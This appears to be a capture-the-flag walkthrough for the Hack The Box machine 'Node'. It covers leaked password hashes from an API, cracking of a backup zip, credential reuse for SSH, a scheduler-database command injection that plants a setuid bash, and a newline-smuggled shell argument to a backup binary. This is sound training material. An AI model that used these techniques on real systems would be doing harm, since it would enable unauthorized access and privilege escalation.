## Node | IP: 10.10.10.58

*[Image: Machine info card]*

### Enumeration

#### Dirbuster

Running Dirbuster (or most other web fuzzing tools) initially yield no results. However, after
tweaking the user agent, fuzzing reveals several directories.

Some interesting ones:  

- `/api/users`
- `/login`
- `/admin`

##### Information Disclosure

Go to: http://10.10.10.58:3000/api/users

Here, we have the username and password hashes of 4 users. We can crack them as they are simple SHA256 hashes, use the `myP14ceAdm1nAcc0uNT:manchester` creds to login to the web app

#### Myplace.backup

Once logged in and the backup is downloaded, it is fairly obvious that the file is a single Base64 string. Using the command ​ `base64 -d myplace.backup > backup.zip` ​ will output a
password-protected ZIP file.
It is possible to crack the password using fcrackzip (or any other similar tool) and `rockyou.txt`. The following command will discover the correct password almost immediately.

```
$ fcrackzip -D -p ../../wordlists/rockyou.txt -u backup.zip
```

The password of zip is: `magicword`

```
┌─[maskofmydisguise@HP-kali]-[~/Desktop/HackTheBox/Linux Machines/Medium/Node/var/www/myplace]
└─➤ grep -r mark app.js
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
```

Now we have another set of creds: `mark:5AYRft73VtFpc84k`

use this password to SSH into the machine as mark,

```
$ ssh mark@10.10.10.58
```

### Priv Esc

##### Tom

```
mark@node:~$ mongo -p -u mark scheduler
# Enter password on prompt: 5AYRft73VtFpc84k
```

In the mongodb shell of database `scheduler`,

```
> db.tasks.insert({"cmd":"cp /bin/bash /tmp/momd;chown tom:admin /tmp/momd; chmod g+s /tmp/momd; chmod u+s /tmp/momd"});
```

Now,

```
mark@node:~$ /tmp/momd -p
momd-4.3$ id
uid=1001(mark) gid=1001(mark) euid=1000(tom) egid=1002(admin) groups=1002(admin),1001(mark)
momd-4.3$ whoami
tom
```

##### Root

Various methods:

1. Buffer overflow in `/usr/local/bin/backup`

	###### Script: `node_bufovrflw.py`
	
	

2. avoid bad characters: `/root /etc ; // $ ..` to do backup and retrieve flag
	+ `momd-4.3$ /usr/local/bin/backup momd 3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110 "$(printf "/ro\n/bin/sh\not")"` - gets us shell as root
	+ Go to `/` and execute `/usr/local/bin/backup momd 3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110 root` - will give us backup of `/root` directory as zip file from which flag can be retrieved.
	+ `/usr/local/bin/backup momd 3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110 /r??t/ro?t.txt` - will give us backup of `/root/root.txt` file as zip from which flag can be retrieved.
		  
		  
		  

### Trophy

